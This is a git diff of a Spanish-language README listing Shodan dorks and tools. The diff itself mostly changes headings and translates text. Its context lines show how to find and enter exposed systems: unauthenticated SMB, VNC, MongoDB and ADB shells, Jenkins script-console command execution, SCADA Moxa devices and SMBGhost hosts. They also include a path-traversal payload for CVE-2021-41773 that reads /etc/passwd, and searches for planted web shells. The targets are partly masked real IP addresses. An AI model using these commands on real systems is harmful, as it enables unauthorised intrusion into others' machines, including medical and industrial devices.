@@ -2,7 +2,7 @@
 
 Lista de Shodan Dorks + herramientas para estos
 
-# DICOM 
+### DICOM 
 El estándar DICOM (Digital Imaging and Communications in Medicine) es un estándar utilizado en la industria médica para la gestión, almacenamiento y transmisión de imágenes médicas, como radiografías, tomografías computarizadas (TC), imágenes de resonancia magnética (IRM), entre otras.
 
 ```sh
@@ -12,7 +12,7 @@ El estándar DICOM (Digital Imaging and Communications in Medicine) es un están
 python3 Dicom.py
 ```
 
-# Elasticsearch
+### Elasticsearch
 Elasticsearch es un motor de búsqueda y análisis distribuido, de código abierto, basado en Lucene. Se utiliza para indexar, buscar y analizar grandes volúmenes de datos en tiempo real. Está diseñado para manejar datos no estructurados o semiestructurados y es especialmente útil para casos de uso en los que se requiere búsqueda y análisis de texto, logística, monitoreo y análisis de registros, y más
 
 ```sh
@@ -28,7 +28,7 @@ curl -X GET "http://192.x.x.153:9200/_search?pretty=true"
 python3 elastic.py -t 192.x.x.153
 ```
 
-## Access FTP Anonymous
+### Access FTP Anonymous
 El acceso FTP anónimo es una forma de conectarse a un servidor FTP sin proporcionar credenciales de autenticación específicas.
 
 ```sh
@@ -44,7 +44,7 @@ shodan search :"220" "230 Login successful." port:21 --fields ip_str --separator
 python3 ftp.py -l ips.txt
 ```
 
-# Authentication Disabled SMB
+### Authentication Disabled SMB
 La autenticación SMB (Server Message Block) sin credenciales, también conocida como acceso SMB anónimo, permite a los usuarios acceder a recursos compartidos en una red sin proporcionar nombres de usuario ni contraseñas. Esto puede ser útil para acceder a carpetas compartidas que se han configurado para permitir el acceso anónimo.
 
 ```sh
@@ -55,7 +55,7 @@ smbclient -L //200.x.x.29/ -N
 smbclient //200.x.x.29/info
 ```
 
-## Access authentication disabled VNC
+### Access authentication disabled VNC
 Esto significa que el servidor VNC está configurado para permitir conexiones sin requerir autenticación.
 
 ```sh
@@ -65,7 +65,7 @@ Esto significa que el servidor VNC está configurado para permitir conexiones si
 vncviewer -passwd none 91.x.x.238
 ```
 
-## Access authentication disabled MongoDB
+### Access authentication disabled MongoDB
 Esto significa que el servidor NoSQL MongoDB está configurado para permitir conexiones sin requerir autenticación.
 
 ```sh
@@ -76,7 +76,7 @@ Esto significa que el servidor NoSQL MongoDB está configurado para permitir con
 mongo --host 139.x.x.5
 ```
 
-## Access Jenkins
+### Access Jenkins
 Se puede visualizar componentes del servicio Jenkins, ejecutar scripts, etc.
 
 ```sh
@@ -89,7 +89,7 @@ add /script
 print "uname -a".execute().text
 ```
 
-## Access devices ADB
+### Access devices ADB
 Es una aplicación de terminal que le permite conectarse al servicio ADB shell de otros dispositivos Android a través de la red.
 
 ```sh
@@ -108,7 +108,7 @@ adb -s 59.x.x.112:5555 shell
 ```
 
 
-## Access devices SCADA Moxa 
+### Access devices SCADA Moxa 
 Sistema SCADA que utiliza productos de la marca Moxa para establecer la conectividad y la comunicación con los dispositivos industriales que están siendo monitoreados y controlados en una infraestructura crítica o proceso industrial.
 
 ```sh
@@ -129,7 +129,7 @@ run
 telnet 212.x.x.14
 ```
 
-## Exploit Infrastructure RCE CVE-2020-0796
+### Exploit Infrastructure RCE CVE-2020-0796
 La vulnerabilidad CVE-2020-0796 se refiere a una vulnerabilidad de ejecución de código remoto (RCE, por sus siglas en inglés) que afecta al protocolo de compartición de archivos SMBv3 (Server Message Block version 3). SMB es un protocolo utilizado para compartir archivos, impresoras y otros recursos en redes de computadoras. La versión 3 (SMBv3) es una versión moderna de este protocolo utilizada en sistemas operativos Windows.
 
 Esta vulnerabilidad se conoció coloquialmente como "SMBGhost" o "CoronaBlue" y fue anunciada en marzo de 2020. 
@@ -139,7 +139,7 @@ vuln:CVE-2020-0796
 country:pe port:445
 ```
 
-## Exploit Web RCE CVE-2021-41773
+### Exploit Web RCE CVE-2021-41773
 ```sh
 shodan search :apache 2.4.49  --fields ip_str,port --separator " " | awk '{print $1":"$2}' | cat > url.txt
 ```
@@ -149,13 +149,13 @@ curl -k http://210.x.x.7/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 ```
 
 
-## Electronic measure
+### Electronic measure
 
 ```sh
 "Server: EIG Embedded Web Server" "200 Document follows"
 ```
 
-## Search Web shell 
+### Search Web shell 
 
 ```sh
 html:"wso.php"
@@ -172,8 +172,8 @@ html:"web.zip"
 ```
 
 
-## OS Windows Obsolete
-Tener sistemas Windows obsoletos y sin soporte puede conllevar una serie de peligros y riesgos significativos para la seguridad, la estabilidad y la eficiencia de tus sistemas y datos.
+### OS Windows Obsolete
+Encontrar Dispositivos Con Windows Obsoletos .
 
 
 ```sh
@@ -190,24 +190,24 @@ os:"Windows 2012" – Windows Server 2012; support end 2018.
 ```
 
 
-### city:
-Find devices in a particular city.<br/>
+### Ciudad:
+Encontrar Dispositivos En Una Ciudad Específica.<br/>
 `city:"Bangalore"`
 
-### country:
-Find devices in a particular country.<br/>
+### País:
+Encontrar Dispositivos En Un País Específico.<br/>
 `country:"IN"`
 
-### geo:
-Find devices by giving geographical coordinates.<br/>
+### Geográfico:
+Encontrar Dispositivos En Coordenadas Geográficas Específicas.<br/>
 `geo:"56.913055,118.250862"`
 
-### hostname:
-Find devices matching the hostname.<br/>
+### Hostname:
+Encontrar Dispositivos Con Un Hostname Específico.<br/>
 `server: "gws" hostname:"google"`
 
-### net:
-Find devices based on an IP address or /x CIDR.<br/>
+### Red `net`:
+Encontrar Dispositivos Por Su IP o /x CIDR.<br/>
 `net:210.214.0.0/16`
 
 ### os:
